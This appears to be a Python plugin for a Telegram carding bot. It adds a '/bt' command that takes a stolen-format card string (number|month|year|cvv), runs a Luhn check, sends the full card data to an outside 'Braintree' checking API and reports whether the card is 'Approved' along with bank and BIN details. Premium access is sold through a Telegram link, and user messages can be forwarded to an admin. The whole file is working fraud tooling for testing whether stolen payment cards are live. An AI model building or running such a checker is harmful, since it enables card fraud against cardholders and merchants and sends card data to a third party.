
import requests
import re
import json
import time
import asyncio
from pyrogram import Client, filters
from pyrogram.enums import ParseMode

import sys
sys.path.append(
    '..'
)
from utils.card_utils import extract_card_info
from utils.bin_lookup import get_bin_info
from utils.response_formatter import get_response_keyboard
from utils.gateway_middleware import validate_card_with_luhn

# Plugin metadata
PLUGIN_INFO = {
    'name': 'Braintree Gateway',
    'commands': ['bt'],
    'prefixes': ['.', '/', '!', '$'],
    'description': 'Braintree API payment gateway',
    'type': 'check',
    'status': 'active'
}

def categorize_braintree_response(api_response):
    """Categorize Braintree API response"""
    try:
        status = api_response.get('status', 'declined').lower()
        response_message = api_response.get('response', 'Unknown response')
        
        if status == 'approved':
            return 'approved', response_message, ''
        elif status == 'declined':
            return 'declined', response_message, ''
        else:
            return 'declined', response_message, ''
    except:
        return 'declined', "Error parsing API response", ''

def get_status_emoji(category):
    """Get emoji for status category"""
    emoji_map = {
        'approved': '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅',
        'declined': '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌'
    }
    return emoji_map.get(category, '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌')

def format_braintree_response(card_info, response_message, suffix, bin_info, execution_time, category):
    """Format Braintree API response for Telegram"""
    card, month, year, cvv = card_info
    cc_display = f"`{card}|{month}|{year}|{cvv}`"
    
    status_text = get_status_emoji(category)
    
    response_text = f"{status_text}\n\n"
    response_text += f"㊕ 𝗖𝗖 ⇾ {cc_display}\n"
    response_text += f"㊕ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree API\n"
    response_text += f"㊕ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_message}{suffix}\n\n"
    
    # Add BIN info if available
    if bin_info:
        response_text += f"㊕ 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('vendor', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('level', 'N/A')}\n"
        response_text += f"㊕ 𝗕𝗮𝗻𝗸: {bin_info.get('bank_name', 'N/A')}\n"
        response_text += f"㊕ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'N/A')} {bin_info.get('flag', '')}\n\n"
    
    response_text += f"㊕ 𝗧𝗼𝗼𝗸 {execution_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
    
    return response_text

class BraintreeGateway:
    def __init__(self):
        self.base_url = "https://onyxenvbot.up.railway.app/braintree/key=yashikaaa/cc="

    async def check_card(self, card, month, year, cvv):
        """Main function to check card through Braintree API"""
        start_time = time.time()
        
        try:
            cc_string = f"{card}|{month}|{year}|{cvv}"
            api_url = f"{self.base_url}{cc_string}"
            
            response = requests.get(api_url, timeout=30)
            response.raise_for_status()  # Raise an exception for HTTP errors
            
            api_response = response.json()
            execution_time = time.time() - start_time
            
            return api_response, None, execution_time
            
        except requests.exceptions.RequestException as e:
            execution_time = time.time() - start_time
            return None, f"API Request Error: {str(e)}", execution_time
        except json.JSONDecodeError:
            execution_time = time.time() - start_time
            return None, "API Response Error: Invalid JSON", execution_time
        except Exception as e:
            execution_time = time.time() - start_time
            return None, f"Error: {str(e)}", execution_time

# Register command handlers
def setup(app: Client):
    """Setup function called when plugin is loaded"""
    
    @app.on_message(filters.command(["bt"], prefixes=[".", "/", "!", "$"]))
    async def bt_command(client, message):
        """Handle /bt command"""
        from utils.admin import check_banned, check_maintenance, check_gateway_access, forward_to_admin_if_enabled
        from utils.database import db
        
        user_id = message.from_user.id
        username = message.from_user.username
        
        # Add user to database
        db.add_user(user_id, username)
        
        # Check if banned
        if await check_banned(client, message):
            return
        
        # Check if maintenance
        if await check_maintenance(client, message):
            return
        
        # Check gateway access
        can_access, reason = await check_gateway_access(user_id, 'bt')
        if not can_access:
            if reason == "locked":
                return
            elif reason == "premium":
                from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
                keyboard = InlineKeyboardMarkup([[
                    InlineKeyboardButton("Buy", url="https://t.me/themigel")
                ]])
                await message.reply_text(
                    "<b>Only available to Premium users !</b>",
                    parse_mode=ParseMode.HTML,
                    reply_markup=keyboard
                )
                return
        
        # Extract card info from message or reply
        text = None
        if message.reply_to_message:
            text = message.reply_to_message.text
        elif message.text:
            command_text = message.text.strip()
            command_parts = command_text.split(maxsplit=1)
            if len(command_parts) > 1:
                text = command_parts[1]
        
        if not text:
            resp = f"""〈<a href='tg://user?id={user_id}'>꫟</a>〉-» 𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝗣𝗜 - CHECK

〈♻️〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» Braintree API

<a href='tg://user?id={user_id}'>╰┈➤</a> 𝙁𝙤𝙧𝙢𝙖𝙩 -» /bt cc|month|year|cvc"""
            await message.reply_text(resp, parse_mode=ParseMode.HTML)
            return
        
        # Extract card info
        card_info = extract_card_info(text)
        if not card_info:
            await message.reply_text("❌ Invalid card format. Use: cc|month|year|cvv")
            return
        
        # Validate card with Luhn algorithm
        if not await validate_card_with_luhn(card_info, "Braintree API", message):
            return
        
        card, month, year, cvv = card_info
        
        # Forward to admin if enabled
        await forward_to_admin_if_enabled(client, message, 'bt')
        
        # Send progress message
        progress_msg = await message.reply_text("𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩...")
        
        # Process the card using Braintree Gateway
        gateway = BraintreeGateway()
        api_response, error, execution_time = await gateway.check_card(card, month, year, cvv)
        
        # Increment check counter
        db.increment_check(user_id, 'bt')
        
        # Get BIN info
        bin_info = get_bin_info(card)
        
        if error:
            # Error occurred during API call
            response_text = format_braintree_response(
                card_info=(card, month, year, cvv),
                response_message=error,
                suffix="",
                bin_info=bin_info,
                execution_time=execution_time,
                category='declined'
            )
        else:
            # Parse API response
            category, response_message, suffix = categorize_braintree_response(api_response)
            
            response_text = format_braintree_response(
                card_info=(card, month, year, cvv),
                response_message=response_message,
                suffix=suffix,
                bin_info=bin_info,
                execution_time=execution_time,
                category=category
            )
        
        # Update progress message with result
        keyboard = get_response_keyboard()
        await progress_msg.edit_text(
            response_text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=keyboard
        )
    
    print("✅ Braintree Gateway commands registered")
